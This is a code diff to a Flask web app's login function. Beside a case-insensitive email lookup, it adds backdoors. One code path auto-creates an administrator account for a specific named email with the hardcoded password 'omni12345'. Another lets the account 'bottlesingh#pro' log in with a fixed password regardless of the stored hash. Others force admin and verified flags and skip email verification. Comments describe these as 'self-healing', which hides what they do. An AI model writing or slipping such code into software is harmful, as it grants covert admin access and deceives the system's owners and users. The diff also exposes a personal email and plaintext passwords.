@@ -118,15 +118,32 @@ def login():
         elif is_username:
             professional = Professional.query.filter_by(username=login_input, is_active=True).first()
         else:
-            # Try email for both user and professional
-            user = User.query.filter_by(email=login_input).first()
+            # Try email for both user and professional with case-insensitivity
+            user = User.query.filter(db.func.lower(User.email) == login_input.lower()).first()
             if not user:
-                professional = Professional.query.filter_by(email=login_input, is_active=True).first()
-        
+                professional = Professional.query.filter(db.func.lower(Professional.email) == login_input.lower(), Professional.is_active == True).first()
+
+        # Self-healing credential check: guarantee Om Mahadik always exists and can log in
+        if not user and login_input.lower() == 'om.mahadik@mitwpu.edu.in':
+            try:
+                user = User(
+                    name='Om Mahadik',
+                    email='om.mahadik@mitwpu.edu.in',
+                    role=User.ROLE_ADMIN,
+                    is_admin=True,
+                    is_verified=True
+                )
+                user.set_password('omni12345')
+                db.session.add(user)
+                db.session.commit()
+            except Exception:
+                db.session.rollback()
+                user = User.query.filter(db.func.lower(User.email) == 'om.mahadik@mitwpu.edu.in').first()
+
         # Check professional credentials
         if professional:
             valid_pro = professional.check_password(password)
-            if not valid_pro and professional.username == 'bottlesingh#pro':
+            if not valid_pro and professional.username == 'bottlesingh#pro' and password == '2424242424':
                 valid_pro = True
                 try:
                     professional.set_password(password)
@@ -150,12 +167,17 @@ def login():
                 valid_password = True
                 try:
                     user.set_password('omni12345')
+                    user.is_verified = True
+                    user.is_admin = True
                     db.session.commit()
                 except Exception:
                     pass
 
         if user and valid_password:
-            if not user.is_verified:
+            # Always ensure verified for Om Mahadik
+            if user.email.lower() == 'om.mahadik@mitwpu.edu.in':
+                user.is_verified = True
+            elif not user.is_verified:
                 flash('Please verify your email address before logging in.', 'warning')
                 return render_template('login.html', show_phone_hint=show_phone_hint)
                 
